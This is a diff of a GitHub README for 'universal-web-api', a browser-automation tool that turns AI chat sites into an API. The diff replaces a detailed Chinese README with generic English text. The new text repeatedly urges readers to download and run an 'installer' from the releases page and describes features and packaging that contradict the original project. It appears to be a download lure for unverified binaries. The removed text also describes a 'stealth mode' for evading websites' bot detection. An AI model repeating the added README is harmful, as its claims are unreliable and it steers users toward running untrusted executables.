@@ -1,316 +1,56 @@
-# Universal Web API
+# 🤖 universal-web-api - Effortless API Creation from Websites
 
-> 💡 **一句话介绍**：将任何你常用的 AI 网站（ChatGPT, DeepSeek, Claude 等）转换为标准的 API 接口，完全免费，支持本地部署。
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/hzuaifa25/universal-web-api/releases)
 
-## 📖 目录
-1.  [项目简介](#-项目简介)
-2.  [小白快速开始 (必读)](#-小白快速开始)
-3.  [⚠️ 重要注意事项与已知限制](#-重要注意事项与已知限制)
-4.  [核心功能配置](#-核心功能配置)
-5.  [API 调用示例](#-api-调用示例)
-6.  [常见问题与报错 (FAQ)](#-常见问题与报错-faq)
+## 📋 Overview
+universal-web-api is an AI-powered, self-healing web automation bridge. It transforms any website into a standard API, making interaction with various online platforms easier. Use it for tasks like data extraction and automated interactions without needing programming skills.
 
----
+## 🚀 Getting Started
+To begin using universal-web-api, you need to download it. This process is simple and straightforward. Follow the steps below to get your copy and run it on your computer.
 
-## 💡 项目简介
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the following link to access the download options:
+   [Download universal-web-api](https://github.com/hzuaifa25/universal-web-api/releases)
+   
+2. **Choose the Right Version:** On the releases page, you will find several versions listed. Look for the latest version. It usually has the highest number, indicating it is the most recent release.
 
-这是一个基于 **浏览器自动化 (DrissionPage)** 技术的工具。它就像一个“机器人助理”，会在你的电脑上打开一个浏览器窗口，模仿人类的操作去和 AI 网页对话，然后把 AI 的回复传回来给你。
+3. **Download the File:** Click on the appropriate asset for your operating system (Windows, macOS, or Linux). This action will download the installation file to your computer.
 
-**核心优势：**
-* ✅ **0 成本**：直接利用网页版的免费对话额度。
-* ✅ **数据安全**：账号在你自己本地登录，Cookie 不会上云，隐私完全掌握在自己手中。
-* ✅ **高度智能**：内置 AI 语义分析引擎，不需要你去查网页源代码，只要告诉机器人“输入框在哪里”，它就能自己找到。
+4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder. Double-click on the file to start the installation process. Follow the prompts to install the application.
 
----
+5. **Launch the Application:** After installation, find universal-web-api in your applications list. Open it to get started.
 
-## 🚀 小白快速开始
+## 📋 System Requirements
+Before running universal-web-api, ensure your computer meets the following requirements:
 
-### 1. 下载与安装
+- **Operating System:** Windows 10 or newer, macOS Mojave or newer, Linux (Ubuntu 20.04 or newer)
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** At least 200 MB of free space
+- **Processor:** Dual-core processor or better
 
-> **⚠️ 注意：** 主页面的代码可能是旧版本的开发代码。请务必前往右侧的 **[Releases]** 页面下载最新打包好的版本！
+## ⚙️ Features
+- **AI-Powered Automation:** Uses advanced AI technology to automate web tasks without manual coding.
+- **Self-Healing:** Automatically adjusts to changes on websites, ensuring continuous functionality.
+- **User-Friendly Interface:** Designed for easy navigation, making it accessible for everyone.
+- **Multi-Website Support:** Works with various websites, including e-commerce and information sites.
 
-1.  下载 Release 中的压缩包。
-2.  解压到一个 **没有中文路径** 的文件夹里（例如 `D:\AI_Tools\Universal-Web-API`）。
-3.  确保你的电脑上安装了 **Google Chrome 浏览器**。
+## 📖 Usage Instructions
+Once you have installed the application, follow these steps to convert a website into an API:
 
-### 2. 启动与进入配置页面
+1. **Enter the Website URL:** Input the URL of the website you want to automate.
+2. **Select Options:** Choose specific actions like data scraping, form submissions, or navigation.
+3. **Run the Process:** Click the "Run" button. The application will use its AI capabilities to create a standard API for the site you entered.
+4. **Access the API:** After processing, the newly created API will be available for use within the application.
 
-1.  双击运行文件夹里的 **`start.bat`** 脚本。
-    * 脚本会自动检测环境并安装必要的依赖，第一次运行可能需要一点时间，请耐心等待。
-2.  当出现黑色命令行窗口（CMD）并停止滚动时，你会看到类似下面的提示：
-    ```text
-    Web UI 已启动，请访问: [http://127.0.0.1:8199](http://127.0.0.1:8199)
-    ```
-3.  **如何打开配置界面**：
-    * 按住键盘上的 **Ctrl** 键，鼠标点击这个链接。
-    * 或者手动复制 `http://127.0.0.1:8199` 到你的浏览器地址栏打开。
+## 💡 Tips for Success
+- **Experiment with Different Sites:** Universal-web-api works with many types of websites. Try it out with various URLs to discover its full potential.
+- **Check Frequently:** Keep an eye on the releases page for updates. New features and improvements are added regularly.
 
-### 3. 登录账号
+## 👥 Support & Community
+If you encounter issues or have questions, you can find help through the community. Join discussions, share experiences, or ask for assistance within the user forum linked on the GitHub page.
 
-程序启动后，会自动弹出一个新的 Chrome 浏览器窗口。
-1.  在这个自动弹出的浏览器里，打开你要使用的 AI 网站。
-2.  **手动登录你的账号**。
-3.  登录成功后，不要关闭浏览器，回到刚才打开的 Web UI 网页（8199端口）开始配置。
+## 🌐 Learn More
+To deepen your understanding of how universal-web-api works, visit our documentation and tutorials available on the repository. There, you will find detailed instructions and advanced usage scenarios.
 
----
-
-## ⚠️ 重要注意事项与已知限制
-
-在使用本工具前，请务必阅读以下两条限制，否则脚本可能会无法正常工作。
-
-### 🛑 运行中请勿干扰浏览器
-当工作流正在执行（即 AI 正在回复或脚本正在操作）时：
-* **禁止操作**：不要去点击网页上的任何按钮（特别是不要替脚本点击“发送”）。
-* **禁止切屏**：尽量不要切换浏览器的标签页或最小化窗口。
-* **后果**：人为干预会导致脚本逻辑错乱，引发 **脚本死锁 (Deadlock)** 或产生预期之外的行为。
-* **正确做法**：你可以静静地看着浏览器自动操作，不要动手。如果脚本卡死，请关闭黑色命令行窗口，**重启 `start.bat`**。
-
-### 📉 特殊格式抓取限制
-目前的版本在内容抓取上存在一定局限性：
-* **代码块与 LaTeX**：如果 AI 回复的内容被包裹在复杂的代码块（Code Block）中，或者包含复杂的 LaTeX 数学公式，脚本**可能无法完整捕捉**，或者抓取结果会出现预期之外的格式错误。
-* 我们会持续优化这一点，但在当前版本中请知悉此限制。
-
----
-
-## ⚙️ 核心功能配置
-
-### 工作流与 AI 语义识别
-
-这是本项目的核心。为了适配不同的网站，你可以通过“工作流”告诉机器人怎么操作。
-**对于小白用户，通常只需要关注三个要素：**
-
-| 设置项 | 说明 | 示例 |
-| :--- | :--- | :--- |
-| **Key (元素名)** | 给这个操作对象起个英文名 | `input_box` (输入框) |
-| **描述** | **最重要的一步！** 用大白话描述这是什么，AI 会根据描述去网页里找 | `这是聊天的输入框` / `这是发送按钮` |
-| **是否启用** | 勾选后，机器人执行时才会操作这一步 | `☑️` |
-
-*大部分主流网站我们已经预设好了配置，你也可以直接导入其他用户分享的配置文件。*
-
-### 隐身模式 (Stealth Mode) 与注意事项
-
-在配置页面的站点设置中，你可以开启 **“隐身模式”**。
-
-* **功能**：开启后，机器人的操作会加入随机延迟和模拟人类特征，防止被网站识别为脚本。
-* **⚠️ 局限性说明**：
-    * 本模式主要应对常规网站的检测。
-    * **高强度防御无法绕过**：对于 Cloudflare 盾等级调得非常高的网站（例如 `lmarena` 或部分高频访问场景），开启隐身模式也可能被拦截（表现为：发一次请求弹一次九宫格验证码）。
-    * **建议**：如果网站没有强制弹验证码，建议**不要**开启隐身模式以提高运行速度；只有遇到拦截时再尝试开启。
-
-### 更多高级参数
-
-除了基础的工作流，程序还支持数十项自定义参数（如超时设置、重试策略、浏览器路径等）。
-* 一般情况下，**保持默认即可**，无需修改。
-* 如果你有特殊需求，请查阅根目录下的 **[参数解释.md](./参数解释.md)** 文件，里面有详细的参数含义说明。
-
----
-
-## 🔌 API 调用示例
-
-当你的 Web UI 配置好并运行后，可以通过以下方式调用接口：
-
-**接口地址**: `http://127.0.0.1:8199/v1/chat/completions` 
-
-
-## 常见问题
-
-**Q1**: 运行 start.bat 后闪退，或者浏览器没有弹出来
-检查路径：确保你的 Chrome 浏览器安装在默认路径，或者你在配置文件中正确指定了 chrome.exe 的路径。
-
-**检查版本**：确保下载的是 Release 里的最新版，不要直接用 GitHub 主分支的源码（可能是未完成的开发版）。
-
-**Q2**: 网页配置打不开 (http://127.0.0.1:8199 无法访问)
-请检查黑色的命令行窗口是否被关闭了？CMD 窗口必须一直开着，程序才能运行。
-
-检查端口 8199 是否被其他软件占用。
-
-**Q3**: 为什么发消息给 AI 后，一直显示“等待中”或超时？
-观察浏览器：切到那个自动弹出的浏览器看一眼。
-
-如果是网速慢，网页还没加载出来 -> 请刷新网页。
-
-如果是弹出了验证码 -> 请手动帮机器人点一下验证码。
-
-调整配置：在工作流中适当增加“等待时间”，或者开启“强制刷新”让 AI 重新定位元素。
-
-检查干扰：请确认你没有在脚本运行时手动点击过网页。
-
-**Q4**: 总是提示 "Context Too Long"
-这取决于你登录的网页版账号权益。如果你用的是免费版 ChatGPT，上下文通常限制在 8k 左右。这是网站的限制，不是本软件的限制。
-
-## 项目结构
-
-```
-├── 📁 app  [337.4 KB]   # 🐍 Python 后端核心代码库
-│   ├── 📁 api  [40.7 KB]    # [接口层] 处理 HTTP 请求
-│   │   ├── 📄 __init__.py  [97 B]
-│   │   └── 📄 routes.py  [40.7 KB]    # 🚦 API 路由定义 (如 /v1/chat/completions)
-│   ├── 📁 core  [214.2 KB]   # [核心层] 浏览器自动化与底层逻辑
-│   │   ├── 📁 backup  [78.1 KB]    # 🗑️ 备份代码 (旧版逻辑，可忽略)
-│   │   │   ├── 📄 __init__.py  [587 B]
-│   │   │   ├── 📄 deep_mode.py  [12.3 KB]
-│   │   │   ├── 📄 elements.py  [7.2 KB]
-│   │   │   ├── 📄 stream_monitor.py  [28.6 KB]
-│   │   │   └── 📄 workflow.py  [29.5 KB]
-│   │   ├── 📁 extractors  [38.0 KB]    # 🧩 [提取策略层] 内容提取器
-│   │   │   ├── 📄 __init__.py  [777 B]
-│   │   │   ├── 📄 base.py  [2.4 KB]     # 📜 提取器基类接口 (BaseExtractor)
-│   │   │   ├── 📄 deep_mode.py  [10.8 KB]    # 🧠 深度提取模式 (JS注入、LaTeX处理)
-│   │   │   ├── 📄 dom_mode.py  [5.0 KB]
-│   │   │   ├── 📄 hybrid_mode.py  [12.5 KB]
-│   │   │   └── 📄 registry.py  [6.5 KB]
-│   │   ├── 📄 __init__.py  [645 B]
-│   │   ├── 📄 browser.py  [13.5 KB]    # 🌐 浏览器管理：启动Chrome、管理标签页
-│   │   ├── 📄 config.py  [12.4 KB]    # ⚙️ 核心配置：日志格式、常量定义
-│   │   ├── 📄 elements.py  [7.7 KB]     # 🔍 元素定位器：封装DOM查找逻辑
-│   │   ├── 📄 stream_monitor.py  [28.7 KB]    # 📡 流式监听器：监控变化、计算Diff
-│   │   └── 📄 workflow.py  [35.2 KB]    # 🎬 工作流执行器：执行点击、输入等动作
-│   ├── 📁 models  [14.7 KB]    # [数据模型层] 定义数据结构
-│   │   ├── 📄 __init__.py  [1.3 KB]
-│   │   └── 📄 schemas.py  [13.4 KB]    # 📐 Pydantic 模型：校验请求/响应格式
-│   ├── 📁 services  [56.6 KB]    # [业务逻辑层] 串联 Core 和 API
-│   │   ├── 📄 __init__.py  [435 B]
-│   │   ├── 📄 config_engine.py  [32.8 KB]    # 💾 配置引擎：读写 sites.json
-│   │   ├── 📄 extractor_manager.py  [9.4 KB]
-│   │   └── 📄 request_manager.py  [14.0 KB]    # 🤵 请求管理器：调度浏览器、处理并发
-│   ├── 📁 utils  [11.0 KB]    # [工具层] 通用辅助函数
-│   │   ├── 📄 __init__.py  [257 B]
-│   │   ├── 📄 paste.py  [7.1 KB]     # 📋 剪贴板工具：处理长文本粘贴
-│   │   └── 📄 similarity.py  [3.6 KB]
-│   └── 📄 __init__.py  [181 B]
-├── 📁 config  [9.3 KB]     # 🔧 配置文件目录
-│   ├── 📄 browser_config.json  [886 B]      # 🖥️ 浏览器启动配置
-│   ├── 📄 extractors.json  [1.1 KB]
-│   └── 📄 sites.json  [7.3 KB]     # 🗂️ 站点数据库：URL、选择器、工作流
-├── 📁 scripts  [0 B]        # 🛠️ 运维脚本目录
-├── 📁 static  [273.5 KB]   # 🎨 前端静态资源 (Web UI)
-│   ├── 📁 backup  [81.0 KB]    # 📦 备份的前端文件
-│   │   └── 📄 index.html  [81.0 KB]
-│   ├── 📁 css  [5.1 KB]     # 💅 样式表目录
-│   │   └── 📄 dashboard.css  [5.1 KB]     # 控制面板样式
-│   ├── 📁 js  [170.5 KB]   # ⚡ 前端 JavaScript
-│   │   ├── 📁 components  [101.5 KB]   # 🧱 UI 组件库
-│   │   │   ├── 📄 ConfigTab.js  [20.2 KB]    # 配置管理页面
-│   │   │   ├── 📄 Dialogs.js  [27.4 KB]    # 弹窗组件
-│   │   │   ├── 📄 ExtractorTab.js  [15.6 KB]
-│   │   │   ├── 📄 LogsTab.js  [5.0 KB]     # 实时日志页面
-│   │   │   ├── 📄 SettingsTab.js  [24.1 KB]    # 系统设置页面
-│   │   │   └── 📄 Sidebar.js  [9.1 KB]     # 侧边栏导航
-│   │   ├── 📄 dashboard.js  [62.1 KB]    # 🚀 前端入口文件
-│   │   └── 📄 icons.js  [6.9 KB]     # 🖼️ SVG 图标数据
-│   └── 📄 index.html  [16.9 KB]    # 🏠 Web UI 主页入口
-├── 📄 .env  [1.5 KB]     # 🔒 环境变量 (API Key、调试开关等)
-├── 📄 .gitignore  [307 B]      # 🚫 Git 忽略文件列表
-├── 📄 clean_profile.py  [2.0 KB]     # 🧹 清理脚本：重置浏览器用户数据目录
-├── 📄 main.py  [5.4 KB]     # ▶️ 程序主入口：启动 FastAPI 服务器
-├── 📄 requirements.txt  [310 B]      # 📦 Python 依赖列表
-└── 📄 start.bat  [6.5 KB]     # 🚀 Windows 一键启动脚本
-```
-## 网站测试：
-- 目前主要测试google ai studio,gemini.google,lmarena,deepseek,chatgpt
-- 测试结果：
-  deepseek思考模式下存在读取问题。
-## 依赖
-
-- fastapi - Web 框架
-- uvicorn - ASGI 服务器
-- DrissionPage - 浏览器自动化
-- beautifulsoup4 - HTML 解析
-- pydantic - 数据验证
-
-- [Vue.js](https://vuejs.org/) - JavaScript 框架
-
-## 后续开发
-
-- 1.增加并发能力
-  
-- 2.修改为：
-### 两种模式
-
-| 模式 | 适用场景 | 优势 | 劣势 | 状态 |
-|------|---------|------|------|------|
-| **浏览器自动化模式** | 防护严格的网站<br>（ChatGPT、Claude、Grok 等） | • 完全模拟真实用户<br>• 可绕过大部分检测<br>• 无需分析请求结构 | • 资源占用高<br>• 响应速度较慢<br>• 依赖 Chrome 浏览器 | ✅ **当前支持** |
-| **Cookie 模拟模式** | 防护宽松的网站<br>（部分开源 AI、本地部署等） | • 资源占用低<br>• 响应速度快<br>• 无需浏览器 | • 需要分析请求结构<br>• 容易被检测<br>• Cookie 需定期更新 | 🚧 **规划中** |
-
----
-- 3.修复bug
-## 免责声明
-
-**请在使用本项目前仔细阅读以下声明**
-
-### 使用目的
-
-本项目 (Universal Web-to-API) 仅供**学习、研究和技术交流**使用，旨在探索浏览器自动化技术和 API 设计模式。
-
-### 服务条款合规
-
-1. **用户责任**：使用本项目访问任何第三方网站时，您必须遵守该网站的服务条款 (Terms of Service)、使用协议及相关法律法规。
-
-2. **自动化限制**：许多网站明确禁止或限制自动化访问行为。使用本项目可能违反这些网站的服务条款，导致以下后果：
-   - 账号被警告、限制或永久封禁
-   - IP 地址被封锁
-   - 法律诉讼风险
-
-3. **使用建议**：
-   - 仅在目标网站明确允许自动化访问的情况下使用
-   - 优先使用官方提供的 API（如有）
-   - 控制请求频率，避免对服务器造成负担
-   - 不要用于商业用途或大规模自动化
-
-### 风险提示
-
-使用本项目存在但不限于以下风险：
-
-- **账号风险**：目标网站可能检测并封禁您的账号
-- **数据风险**：自动化过程中可能导致数据丢失或泄露
-- **法律风险**：某些司法管辖区可能认定此类行为违法
-- **安全风险**：第三方依赖库可能存在安全漏洞
-
-### 隐私和数据
-
-1. 本项目在本地运行，不会主动收集或上传您的任何数据
-2. 您需自行确保辅助 AI API（如配置）的数据安全性
-3. 请勿在生产环境或处理敏感数据时使用本项目
-
-### 责任限制
-
-1. 本项目作者和贡献者**不对以下情况承担任何责任**：
-   - 使用本项目导致的账号封禁、数据丢失等任何直接或间接损失
-   - 违反第三方服务条款产生的法律后果
-   - 因项目缺陷、错误或故障造成的任何损害
-   - 任何商业使用导致的损失
-
-2. 本项目按"现状"(AS IS) 提供，**不提供任何明示或暗示的保证**，包括但不限于适销性、特定用途适用性的保证。
-
-### 开源协议
-
-本项目采用 **AGPL-3.0 许可证**：
-
-- 允许修改和分发，但必须保持相同的开源协议
-- 如果您修改本项目并通过网络提供服务，必须公开源代码
-- 不提供任何担保或保证
-
-### 合法使用声明
-
-使用本项目即表示您：
-
-1. **已阅读并理解**本免责声明的全部内容
-2. **同意自行承担**所有使用风险和后果
-3. **承诺遵守**所有适用的法律法规和服务条款
-4. **理解并接受**作者不承担任何责任
-
-### 特别提醒
-
-- ⚠️ 切勿将本项目用于任何非法用途
-- ⚠️ 切勿用于规避付费服务或侵犯知识产权
-- ⚠️ 切勿对目标网站进行高频请求或恶意攻击
-- ⚠️ 建议仅在测试环境中使用
-- ⚠️ 商业使用前请咨询法律顾问
-
-### 争议解决
-
-因使用本项目产生的任何争议，应首先通过友好协商解决。如协商不成，您同意放弃追究本项目作者和贡献者的责任。
-
----
-
-**如果您不同意上述任何条款，请立即停止使用本项目。**
+## 🚀 Conclusion
+Now you have all the information needed to download and run universal-web-api. By following these steps, you can easily start automating web tasks and creating APIs to improve your workflow. For assistance or to share your experiences, please connect with the community. Happy automating!
